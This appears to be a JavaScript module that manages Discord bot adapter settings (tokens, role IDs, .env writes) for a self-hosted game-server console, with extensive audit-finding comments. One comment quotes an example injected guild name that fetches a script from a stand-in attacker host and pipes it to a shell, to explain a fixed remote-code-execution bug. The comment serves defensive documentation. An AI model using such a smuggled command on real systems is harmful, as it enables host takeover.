import { randomBytes } from "node:crypto";
import { existsSync, mkdirSync, writeFileSync, chmodSync, unlinkSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { discordAdapterEnabled, discordRoleMappingFromEnv } from "./adapter.js";
import { readDiscordBotApiToken } from "./routes.js";
import { updateEnvFileValues } from "../../services/envFile.js";

const SNOWFLAKE_PATTERN = /^\d{15,21}$/;
const DEFAULT_TOKEN_FILE = "runtime/secrets/discord-adapter-token.txt";

// Global Constraint: this is the server-side hardcoded set of .env keys
// this feature is ever allowed to write. The env-key name is never derived
// from a request-body field name (Layer 1 Security Architect audit finding).
const MANAGED_ENV_KEYS = Object.freeze({
  enabled: "DUNE_DISCORD_ADAPTER_ENABLED",
  tokenFile: "DUNE_DISCORD_ADAPTER_TOKEN_FILE",
  // directToken: readDiscordBotApiToken() (routes.js) checks this direct
  // value BEFORE the token file -- a real, documented manual-setup path.
  // Audit finding #4 (HIGH): enableDiscordBotAdapter()/
  // regenerateDiscordBotToken() must clear it whenever they mint a fresh
  // file-based token, or an operator who set it directly would be shown a
  // fresh, plausible-looking token that the live adapter never actually
  // authenticates against, because the untouched direct var keeps winning.
  directToken: "DUNE_DISCORD_ADAPTER_TOKEN",
  player: "DISCORD_PLAYER_ROLE_IDS",
  moderator: "DISCORD_MODERATOR_ROLE_IDS",
  admin: "DISCORD_ADMIN_ROLE_IDS",
  // Task 2 (hosted-bot console-initiated OAuth registration plan): the
  // console's hosted/self-hosted `choice` toggle previously lived only in
  // browser localStorage -- never sent to or read from the backend. This is
  // the real, persisted, server-readable source of truth Task 6's /register
  // route gates against.
  deploymentChoice: "DUNE_DISCORD_ADAPTER_DEPLOYMENT_CHOICE",
  // Final integration review (Important #5): which guild the hosted-bot
  // /register route last successfully registered, so the "Connected to
  // hosted bot for {name}" status survives a page reload instead of being
  // pure in-memory React state (see persistHostedBotConnectedGuild below).
  hostedBotConnectedGuildId: "DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_ID",
  hostedBotConnectedGuildName: "DUNE_DISCORD_HOSTED_BOT_CONNECTED_GUILD_NAME"
});

// Server-side allowlist for the persisted deployment choice -- never trust
// a request-body value verbatim into .env (same discipline as
// MANAGED_ENV_KEYS itself: the set of values this key can ever hold is
// fixed here, not derived from arbitrary caller input).
function normalizeDeploymentChoice(value) {
  return value === "hosted" || value === "self-hosted" ? value : null;
}

export function validateDiscordRoleIds(rawValue) {
  const trimmed = String(rawValue || "").trim();
  if (!trimmed) return { ok: true, roleIds: [] };
  const parts = trimmed.split(",").map((part) => part.trim()).filter(Boolean);
  const invalid = parts.filter((part) => !SNOWFLAKE_PATTERN.test(part));
  if (invalid.length) return { ok: false, error: `Invalid Discord role ID(s): ${invalid.join(", ")}. Expected 15-21 digit numeric IDs.` };
  return { ok: true, roleIds: parts };
}

export function readDiscordBotSettingsState(config) {
  const mapping = discordRoleMappingFromEnv();
  const token = readDiscordBotApiToken(config);
  return {
    enabled: discordAdapterEnabled(config),
    roleIds: {
      player: mapping.playerRoleIds,
      moderator: mapping.moderatorRoleIds,
      admin: mapping.adminRoleIds
    },
    tokenConfigured: Boolean(token),
    deploymentChoice: normalizeDeploymentChoice(process.env[MANAGED_ENV_KEYS.deploymentChoice] || null),
    hostedBotConnectedGuildId: process.env[MANAGED_ENV_KEYS.hostedBotConnectedGuildId] || null,
    hostedBotConnectedGuildName: process.env[MANAGED_ENV_KEYS.hostedBotConnectedGuildName] || null,
    // Real UAT finding (2026-09-09): "Connect to hosted bot" needs its own,
    // independent Discord Application (Client ID/Secret/Redirect URI) --
    // deliberately NOT the console-sign-in one (Settings -> Discord OAuth).
    // The Client ID and Redirect URI are safe to return (same non-secret
    // status this function already reports for tokenConfigured above);
    // the client secret itself is never returned, matching that same
    // convention.
    hostedBotOAuthConfigured: Boolean(config.discordHostedBotOAuthClientId && config.discordHostedBotOAuthClientSecret && config.discordHostedBotOAuthRedirectUri),
    hostedBotOAuthClientId: config.discordHostedBotOAuthClientId || null,
    hostedBotOAuthRedirectUri: config.discordHostedBotOAuthRedirectUri || null,
    // dune-awakening-selfhost-docker#903: safe to return -- a Discord
    // client_id is not a secret (same status hostedBotOAuthClientId
    // above already has). Lets the frontend build its own "Add to
    // Discord" invite link from the real, possibly-overridden backend
    // value instead of hardcoding the default a second time.
    autoInviteDiscordClientId: config.autoInviteDiscordClientId
  };
}

// persistHostedBotConnectedGuild: the fix for Important #5 from the final
// integration review -- "Connected to hosted bot for {name}" was pure
// in-memory React state, so a page reload after a genuinely successful
// registration showed "Connect to hosted bot" again as if nothing had
// happened. Called by the /register route handler (server.js) only after
// mentat-backend's own response confirms the registration succeeded.
//
// guildId is the OAuth-verified id already checked against the caller's
// owned-guild set by the route handler before this is ever called --
// nothing here re-derives authorization from it. guildName is a caller-
// supplied display label ONLY (the request body's `guildName`, sent by
// DiscordBotSection's own guild picker, which got it from the same
// OAuth-verified owned-guilds list) -- it is never used for any
// authorization decision, only rendered back as plain text, so this
// deliberately does not attempt to independently re-verify it against
// Discord. Trimmed and length-capped (Discord's own guild-name limit is
// 100 characters) before being written, same defensive-input discipline as
// validateDiscordRoleIds() above -- free text from an external service
// should never be written to .env unbounded.
// dune-awakening-selfhost-docker#860 (Security Architect wizard audit
// finding): guildName is attacker-controllable free text (any Discord user
// who owns a guild picks its display name) and previously flowed into
// .env with only length-capping. envFile.js's quoteEnv() does correctly
// JSON-escape it on write when it contains anything outside a safe
// character set -- but whether the downstream .env loader (docker-compose/
// container startup) re-interprets an escaped "\n" sequence back into a
// literal newline was never traced. Reject control characters, "=", and
// newlines/CR explicitly, as defense-in-depth independent of the loader's
// actual behavior, rather than trusting quoteEnv() alone.
//
// dune-awakening-selfhost-docker#870 (CRITICAL, found by automated review
// on #801 after that PR had already merged): the control-chars-and-"="
// blocklist above left `$` and backtick completely untouched. quoteEnv()'s
// JSON.stringify() only escapes '"', '\\', and control characters, so a
// guild name like `Evil$(curl attacker.example|sh)Server` was written
// verbatim into a double-quoted .env line. runtime/scripts/start-all.sh
// (and sibling scripts) `. ./.env` that file inside `set -a; ...; set +a`
// -- a real bash *source*, not a passive read -- so that payload executed
// as a real shell command with the script's own privileges. The attacker
// here is not the console operator: it's any Discord user with Manage
// Server permission in a guild the operator merely owns/administers, so
// this was a genuine Discord-side-actor-to-host-RCE privilege boundary
// crossing, not a self-harm scenario. Switched from a blocklist to an
// ALLOWLIST -- this value is display-only (never used for authorization,
// see this function's own callers), so keeping only Unicode letters,
// digits, a literal space, and a small, genuinely-safe punctuation set is
// categorically safer than trying to enumerate every shell metacharacter
// (`$`, backtick, parens, brackets, braces, quotes, `;`, `|`, `&`, `<`,
// `>`, `\`, `=`, `~`, `*` are all excluded by construction, not by name).
//
// Layer 2 audit finding (real, found by /code-review high on this exact
// PR before merge): the first version of this allowlist used `\s` for
// whitespace, which in JS regex also matches \n, \r, \t, \v, \f, and the
// Unicode line/paragraph separators U+2028/U+2029 -- not just a literal
// space. That silently reopened a version of the very risk this file's
// own #860 comment above already flags as "never traced": bash sourcing
// doesn't unescape quoteEnv()'s JSON-escaped "\n" back to a real newline,
// but Docker Compose's own separate .env-file parser (used for ${VAR}
// interpolation in docker-compose.web.yml) is documented to do exactly
// that. Using a literal space here instead of \s closes that gap by
// construction, matching the original blocklist's own explicit rejection
// of every control character, not just the shell-metacharacter set.
function sanitizeEnvDisplayValue(value) {
  return value.replace(/[^\p{L}\p{N} .,'!?_-]/gu, "");
}

export async function persistHostedBotConnectedGuild(config, { guildId, guildName } = {}) {
  const safeGuildId = String(guildId || "").trim();
  const safeGuildName = sanitizeEnvDisplayValue(String(guildName || "").trim()).slice(0, 100) || safeGuildId;
  if (!safeGuildId) return { ok: false };
  await updateEnvFileValues(config.repoRoot, {
    [MANAGED_ENV_KEYS.hostedBotConnectedGuildId]: safeGuildId,
    [MANAGED_ENV_KEYS.hostedBotConnectedGuildName]: safeGuildName
  });
  // Mirror into the RUNNING process too -- same reasoning as every other
  // mirror in this file: readDiscordBotSettingsState() reads process.env
  // directly, and this write deliberately never triggers a container
  // recreate (registering a guild with the hosted bot doesn't need one),
  // so without this a GET immediately after registering, in this same
  // process, would still report the previous value (or none) until a
  // restart that may never happen.
  process.env[MANAGED_ENV_KEYS.hostedBotConnectedGuildId] = safeGuildId;
  process.env[MANAGED_ENV_KEYS.hostedBotConnectedGuildName] = safeGuildName;
  return { ok: true };
}

// clearHostedBotConnectedGuild: fix round 2 (final-review re-review,
// Priority 2) -- persistHostedBotConnectedGuild() above had no
// corresponding clear path, so once set, "Connected to hosted bot for {name}"
// could never stop being shown, even after an event that makes it a real
// lie: regenerating the adapter token (mentat's registration is keyed to
// the OLD token, which is now invalid) or the operator explicitly switching
// back to "self-hosted" (they've said they're not using the hosted bot
// anymore). Both callers below are the only two places this needs calling
// from -- see their own comments for why. Writes empty strings (matching
// this file's existing directToken-clearing convention), which
// readDiscordBotSettingsState()'s `|| null` reads treat identically to
// never having been set.
export async function clearHostedBotConnectedGuild(config) {
  await updateEnvFileValues(config.repoRoot, {
    [MANAGED_ENV_KEYS.hostedBotConnectedGuildId]: "",
    [MANAGED_ENV_KEYS.hostedBotConnectedGuildName]: ""
  });
  // Mirror into the RUNNING process too -- same reasoning as every other
  // mirror in this file.
  process.env[MANAGED_ENV_KEYS.hostedBotConnectedGuildId] = "";
  process.env[MANAGED_ENV_KEYS.hostedBotConnectedGuildName] = "";
  return { ok: true };
}

// enableDiscordBotAdapter: validates role IDs, generates a fresh token
// (Layer 1 Security Architect audit finding -- "Enable" always overwrites,
// never conditionally reuses an abandoned manual attempt's file), writes
// the secret file, then flushes every managed .env key in one atomic
// updateEnvFileValues() call. Does NOT launch the recreate helper itself --
// the caller (the route handler) does that via tasks.create(), after this
// function returns successfully, matching the "write everything, then
// launch" ordering the design requires. Returns the plaintext token so the
// route handler can hand it to the frontend exactly once, immediately
// after generation (Design §3.1's "masked, with reveal/copy" requirement)
// -- readDiscordBotSettingsState() never returns it on subsequent reads,
// since the token file's own content is the only persistent copy.
export async function enableDiscordBotAdapter(config, roleIdsByTier = {}, options = {}) {
  const repoRoot = config.repoRoot;
  const tokenFile = resolve(repoRoot, DEFAULT_TOKEN_FILE);
  const token = randomBytes(32).toString("hex");
  mkdirSync(dirname(tokenFile), { recursive: true });
  writeFileSync(tokenFile, `${token}\n`, { mode: 0o600 });
  try { chmodSync(tokenFile, 0o600); } catch {}

  const entries = [
    [MANAGED_ENV_KEYS.enabled, "true"],
    [MANAGED_ENV_KEYS.tokenFile, DEFAULT_TOKEN_FILE],
    // Clear any direct manual-setup token -- see MANAGED_ENV_KEYS.directToken's
    // own comment for why (audit finding #4).
    [MANAGED_ENV_KEYS.directToken, ""],
    [MANAGED_ENV_KEYS.player, (roleIdsByTier.player || []).join(",")],
    [MANAGED_ENV_KEYS.moderator, (roleIdsByTier.moderator || []).join(",")],
    [MANAGED_ENV_KEYS.admin, (roleIdsByTier.admin || []).join(",")]
  ];
  // Task 2: only persist deploymentChoice when a valid value was actually
  // supplied -- an omitted/invalid value leaves whatever was already
  // persisted untouched, rather than clobbering it with an empty string.
  const normalizedChoice = normalizeDeploymentChoice(options.deploymentChoice);
  if (normalizedChoice) entries.push([MANAGED_ENV_KEYS.deploymentChoice, normalizedChoice]);
  await updateEnvFileValues(repoRoot, Object.fromEntries(entries));

  // Mirror the two values every other part of this feature reads directly
  // from process.env into the RUNNING process too. Writing .env on disk
  // does NOT change what an already-running Node process sees -- .env is
  // only ever re-read at container start; a write to the file alone has
  // no effect here until the queued recreate task (launched by the route
  // handler, after this function returns) finishes.
  //
  // Audit finding #1 residual gap (second review round): without mirroring
  // `enabled`, discordAdapterEnabled() keeps evaluating false in THIS
  // process until that recreate completes, so a second /enable POST
  // arriving in the race window before it still mints a SECOND fresh
  // token -- reproducing finding #1's original bug inside a narrower
  // window instead of closing it.
  //
  // Audit finding #4 residual gap: without mirroring the cleared direct
  // token, readDiscordBotApiToken() (which also reads process.env
  // directly) keeps returning a stale, already-loaded direct value in
  // this process until that same recreate completes.
  //
  // Found while adding route-level integration coverage: the same
  // staleness applies to the token FILE PATH itself. readDiscordBotApiToken()
  // reads process.env.DUNE_DISCORD_ADAPTER_TOKEN_FILE directly, so without
  // mirroring it here too, a fresh install's first-ever enable would write
  // the path to .env on disk but leave THIS process's own process.env
  // without it -- readDiscordBotSettingsState() would keep reporting
  // tokenConfigured:false (and the live adapter route would keep reporting
  // the credential as not configured) until a restart, even though the
  // token file was just written. Mirror the resolved ABSOLUTE path (the
  // same `tokenFile` this function just wrote to), not the relative
  // DEFAULT_TOKEN_FILE constant written to .env -- readDiscordBotApiToken()
  // reads this value with a bare readFileSync(), no resolve() against
  // repoRoot, so a relative value here would only work by accident of the
  // process's current working directory happening to already be repoRoot.
  //
  // Same reasoning applies to the 3 role-ID keys: discordRoleMappingFromEnv()
  // (adapter.js) also reads process.env directly. Without mirroring them
  // here, a GET of the settings state in this same process, in the window
  // before the queued console restart completes, would report the role IDs
  // from BEFORE this call, not what was just submitted.
  process.env[MANAGED_ENV_KEYS.enabled] = "true";
  process.env[MANAGED_ENV_KEYS.directToken] = "";
  process.env[MANAGED_ENV_KEYS.tokenFile] = tokenFile;
  process.env[MANAGED_ENV_KEYS.player] = (roleIdsByTier.player || []).join(",");
  process.env[MANAGED_ENV_KEYS.moderator] = (roleIdsByTier.moderator || []).join(",");
  process.env[MANAGED_ENV_KEYS.admin] = (roleIdsByTier.admin || []).join(",");
  if (normalizedChoice) process.env[MANAGED_ENV_KEYS.deploymentChoice] = normalizedChoice;
  // Fix round 2, Priority 2: an operator explicitly choosing "self-hosted"
  // here has said they're not using the hosted bot -- any previously
  // persisted "Connected to hosted bot for {name}" status is now a lie and
  // must be cleared so "Connect to hosted bot" can reappear if they ever
  // switch back to "hosted" and register again. In practice this branch
  // (a genuine first-time enable) can rarely have an existing connection to
  // clear, but it's included for the same reason updateDiscordBotRoleIds
  // below needs it -- both functions persist deploymentChoice, and neither
  // should be a hole this fix misses.
  if (normalizedChoice === "self-hosted") await clearHostedBotConnectedGuild(config);

  return { ok: true, tokenFile: DEFAULT_TOKEN_FILE, token };
}

// disableDiscordBotAdapter: the counterpart to enableDiscordBotAdapter()
// above -- a real UAT finding (2026-09-09, "I see no path to remove the
// bot") that this feature shipped an Enable/Save/Regenerate surface but no
// way back to "never configured" at all. Fully resets every MANAGED_ENV_KEYS
// value this feature owns, rather than a soft toggle that leaves the old
// token/role IDs/choice sitting around -- an operator who disables and
// later re-enables goes through the wizard from a genuinely clean step 1,
// matching what a fresh install looks like. Does NOT launch the recreate
// helper itself -- same convention as enableDiscordBotAdapter(), the caller
// (the route handler) does that via tasks.create().
export async function disableDiscordBotAdapter(config) {
  const repoRoot = config.repoRoot;
  const tokenFile = resolve(repoRoot, DEFAULT_TOKEN_FILE);
  // Best-effort: the token file may already be missing (never enabled, or a
  // manual DUNE_DISCORD_ADAPTER_TOKEN_FILE override pointing elsewhere) --
  // disabling must still succeed either way.
  try { unlinkSync(tokenFile); } catch {}

  await updateEnvFileValues(repoRoot, {
    [MANAGED_ENV_KEYS.enabled]: "false",
    [MANAGED_ENV_KEYS.directToken]: "",
    [MANAGED_ENV_KEYS.player]: "",
    [MANAGED_ENV_KEYS.moderator]: "",
    [MANAGED_ENV_KEYS.admin]: "",
    [MANAGED_ENV_KEYS.deploymentChoice]: ""
  });

  // Mirror into the RUNNING process too -- see enableDiscordBotAdapter()'s
  // own comment above for why this is necessary even though the recreate
  // task (launched by the route handler after this returns) is what makes
  // the change durable across a fresh process.
  process.env[MANAGED_ENV_KEYS.enabled] = "false";
  process.env[MANAGED_ENV_KEYS.directToken] = "";
  process.env[MANAGED_ENV_KEYS.player] = "";
  process.env[MANAGED_ENV_KEYS.moderator] = "";
  process.env[MANAGED_ENV_KEYS.admin] = "";
  process.env[MANAGED_ENV_KEYS.deploymentChoice] = "";

  // Any hosted-bot registration was keyed to the token/choice just wiped
  // above -- same reasoning as regenerateDiscordBotToken().
  await clearHostedBotConnectedGuild(config);
  return { ok: true };
}

// updateDiscordBotRoleIds: writes ONLY the 3 role-ID env keys, via the
// same atomic updateEnvFileValues() call, and never touches the token file
// or the enabled flag. This is deliberately a separate function from
// enableDiscordBotAdapter() above, not a code path inside it -- an admin
// editing role IDs on an already-enabled adapter must never, as a side
// effect, mint a fresh token and silently break the live bot (found during
// this plan's own self-review: the first draft had the frontend's "Save
// Role IDs" button call the same enable path, which would have rotated the
// token on every role-ID edit). Still triggers the recreate helper (the
// caller does that, same as enableDiscordBotAdapter) because role IDs are
// only read from the environment at container start.
export async function updateDiscordBotRoleIds(config, roleIdsByTier = {}, options = {}) {
  const entries = [
    [MANAGED_ENV_KEYS.player, (roleIdsByTier.player || []).join(",")],
    [MANAGED_ENV_KEYS.moderator, (roleIdsByTier.moderator || []).join(",")],
    [MANAGED_ENV_KEYS.admin, (roleIdsByTier.admin || []).join(",")]
  ];
  // Task 2: same allowlist/only-write-when-valid discipline as
  // enableDiscordBotAdapter() above.
  const normalizedChoice = normalizeDeploymentChoice(options.deploymentChoice);
  if (normalizedChoice) entries.push([MANAGED_ENV_KEYS.deploymentChoice, normalizedChoice]);
  await updateEnvFileValues(config.repoRoot, Object.fromEntries(entries));
  // Mirror into the RUNNING process too, for the same reason
  // enableDiscordBotAdapter() does -- discordRoleMappingFromEnv() reads
  // process.env directly, so without this a GET of the settings state in
  // this same process, in the window before the queued console restart
  // completes, would report the role IDs from before this save. This is
  // the function an admin editing role IDs on an already-live adapter
  // actually goes through, so it's the more commonly hit path in practice.
  process.env[MANAGED_ENV_KEYS.player] = (roleIdsByTier.player || []).join(",");
  process.env[MANAGED_ENV_KEYS.moderator] = (roleIdsByTier.moderator || []).join(",");
  process.env[MANAGED_ENV_KEYS.admin] = (roleIdsByTier.admin || []).join(",");
  if (normalizedChoice) process.env[MANAGED_ENV_KEYS.deploymentChoice] = normalizedChoice;
  // Fix round 2, Priority 2: this is the function the frontend's Save Role
  // IDs button actually calls (see DiscordBotSection.tsx's
  // handleUpdateRoleIds), i.e. the real path an operator takes to switch an
  // already-connected console back to "self-hosted" -- they've explicitly
  // said they're not using the hosted bot anymore, so any previously
  // persisted "Connected to hosted bot for {name}" status is now a lie.
  // Clear it so "Connect to hosted bot" can reappear if they ever switch
  // back to "hosted".
  if (normalizedChoice === "self-hosted") await clearHostedBotConnectedGuild(config);
  return { ok: true };
}

// setDeploymentChoice: real UAT finding (2026-09-10) -- the 3-step wizard
// redesign needs deploymentChoice persisted server-side the moment the
// operator picks "Hosted bot", BEFORE role IDs are entered or the adapter
// is enabled, so /oauth/start's deploymentChoice gate passes in time for
// "Add bot to Discord" (now step 1, ahead of role config and the actual
// restart). Deliberately the smallest possible write -- only this one key,
// no role IDs, no token, and critically NO restart task: nothing about the
// live adapter's runtime behavior depends on deploymentChoice itself (it
// only gates the hosted-bot OAuth routes, which read it directly from
// process.env, mirrored below same as every other setter in this file), so
// there is nothing here a container recreate would need to apply.
export async function setDeploymentChoice(config, choice) {
  const normalizedChoice = normalizeDeploymentChoice(choice);
  if (!normalizedChoice) return { ok: false };
  await updateEnvFileValues(config.repoRoot, { [MANAGED_ENV_KEYS.deploymentChoice]: normalizedChoice });
  process.env[MANAGED_ENV_KEYS.deploymentChoice] = normalizedChoice;
  // Same reasoning as updateDiscordBotRoleIds() above -- switching to
  // self-hosted invalidates any existing hosted-bot connection.
  if (normalizedChoice === "self-hosted") await clearHostedBotConnectedGuild(config);
  return { ok: true };
}

// regenerateDiscordBotToken: rewrites the token FILE's content (read fresh
// on every request by readDiscordBotApiToken(), so a container recreate is
// never needed for this specific operation -- Layer 1 Cloud Security +
// Security Architect audit finding), and ALSO clears any direct
// DUNE_DISCORD_ADAPTER_TOKEN value in .env (audit finding #4, HIGH -- see
// MANAGED_ENV_KEYS.directToken's comment: without this, an operator who set
// that var manually would be shown a fresh token that never actually
// becomes authoritative, because the untouched direct var still wins in
// readDiscordBotApiToken()'s precedence order).
//
// Finding 2 (IMPORTANT, final review): ALSO (re-)writes the token FILE PATH
// key (DUNE_DISCORD_ADAPTER_TOKEN_FILE) to DEFAULT_TOKEN_FILE -- the same
// path this function just wrote the fresh token's content to. Without
// this, an operator whose .env has ONLY the legacy DUNE_BOT_API_TOKEN_FILE
// set (no DUNE_DISCORD_ADAPTER_TOKEN_FILE at all -- a real, documented
// manual-setup path that predates this feature) would be shown a fresh
// token here that readDiscordBotApiToken() (routes.js) never actually uses
// to authenticate: its precedence chain only reaches DUNE_BOT_API_TOKEN_FILE
// as a fallback AFTER DUNE_DISCORD_ADAPTER_TOKEN_FILE, so leaving that key
// unset lets the untouched legacy path keep winning, silently pointing at
// the OLD token forever. Same class of bug as the direct-token clearing
// above (audit finding #4), just for a third precedence source that fix
// missed. Writing the SAME value (DEFAULT_TOKEN_FILE) on every call is
// idempotent -- safe even when this key was already set correctly by an
// earlier enableDiscordBotAdapter() call -- and deliberately does NOT
// trigger a container recreate: the .env value only matters at container
// start, but the in-process mirror below (like the direct-token clear
// above) makes it immediately authoritative in THIS process regardless.
//
// Returns the plaintext token for the same one-time-display reason as
// enableDiscordBotAdapter() above.
export async function regenerateDiscordBotToken(config) {
  const repoRoot = config.repoRoot;
  const tokenFile = resolve(repoRoot, DEFAULT_TOKEN_FILE);
  if (!existsSync(dirname(tokenFile))) mkdirSync(dirname(tokenFile), { recursive: true });
  const token = randomBytes(32).toString("hex");
  writeFileSync(tokenFile, `${token}\n`, { mode: 0o600 });
  try { chmodSync(tokenFile, 0o600); } catch {}
  await updateEnvFileValues(repoRoot, {
    [MANAGED_ENV_KEYS.directToken]: "",
    [MANAGED_ENV_KEYS.tokenFile]: DEFAULT_TOKEN_FILE
  });
  // Mirror into the RUNNING process too -- see enableDiscordBotAdapter()'s
  // equivalent comment above for why. This function deliberately never
  // triggers a container recreate (the token file's content is read fresh
  // per request, so no recreate should be needed), which means NOTHING
  // else will ever refresh process.env for these vars. Without these
  // lines, an operator who previously set DUNE_DISCORD_ADAPTER_TOKEN
  // directly, or whose process.env still has a stale/legacy token file
  // path loaded from container start, would have the newly-shown token
  // silently ignored forever by this already-running process (audit
  // finding #4 residual gap; Finding 2 above for the token-file-path
  // case). Mirror the resolved ABSOLUTE path (the same `tokenFile` this
  // function just wrote to), matching enableDiscordBotAdapter()'s own
  // convention -- readDiscordBotApiToken() does a bare readFileSync() with
  // no resolve() against repoRoot, so a relative value here would only
  // work by accident of the process's current working directory.
  process.env[MANAGED_ENV_KEYS.directToken] = "";
  process.env[MANAGED_ENV_KEYS.tokenFile] = tokenFile;
  // Fix round 2, Priority 2: mentat's own registration for this console is
  // keyed to the OLD token, which just became permanently invalid above --
  // any previously persisted "Connected to hosted bot for {name}" status is
  // now a lie (mentat will reject the next call it makes against this
  // console using the stale token), and it's the ONLY thing gating the
  // "Connect to hosted bot" button back into view. Without this, an
  // operator who regenerates their token has no way back into the
  // registration flow at all.
  await clearHostedBotConnectedGuild(config);
  return { ok: true, token };
}

// applyDiscordBotEnableRequest: the token-safety fix for the /enable
// route -- audit finding #1 (CRITICAL). A bare POST to /enable used to
// call enableDiscordBotAdapter() unconditionally, which always mints a
// fresh token, regardless of whether the adapter was already enabled.
// /enable is gated by updates:apply (admin-reachable), while token
// regeneration is deliberately scoped to the owner-only
// settings:discord-bot-regenerate-token action specifically because
// rotation is disruptive/irreversible -- an admin re-POSTing /enable
// (e.g. the frontend's "Save" on an already-enabled adapter) could
// silently re-mint the live token, achieving the exact effect that gate
// exists to reserve for owner.
//
// Once the adapter is already enabled, this routes the request through
// updateDiscordBotRoleIds() (the token-safe function) instead --
// repeat calls to /enable then behave exactly like /role-ids: safe,
// idempotent, no silent token rotation. A genuine first-time enable
// (from disabled) still goes through enableDiscordBotAdapter() and
// mints a token. tokenMinted tells the route handler whether to include
// `token` in its response.
export async function applyDiscordBotEnableRequest(config, roleIdsByTier = {}, options = {}) {
  if (discordAdapterEnabled(config)) {
    const result = await updateDiscordBotRoleIds(config, roleIdsByTier, options);
    return { ok: result.ok, tokenMinted: false };
  }
  const result = await enableDiscordBotAdapter(config, roleIdsByTier, options);
  return { ok: result.ok, tokenMinted: true, token: result.token, tokenFile: result.tokenFile };
}

// discordAdminRoleIdsChanged: order-independent set comparison used by
// the /enable and /role-ids route handlers to decide whether a request
// is attempting to change which Discord roles map to the "admin"
// bot-command tier -- audit finding #2 (HIGH). Per policy.js, that tier
// grants nearly every non-self-scoped bot capability; before this
// feature, DISCORD_ADMIN_ROLE_IDS was read-only from .env (no route
// ever wrote it), so an admin-tier console operator could not
// previously grant Discord-bot-admin capability to an arbitrary Discord
// role. A request that only touches player/moderator role IDs (this
// returns false) remains admin-reachable as before.
export function discordAdminRoleIdsChanged(currentAdminRoleIds, requestedAdminRoleIds) {
  const current = new Set((currentAdminRoleIds || []).map(String));
  const requested = new Set((requestedAdminRoleIds || []).map(String));
  if (current.size !== requested.size) return true;
  for (const id of requested) {
    if (!current.has(id)) return true;
  }
  return false;
}
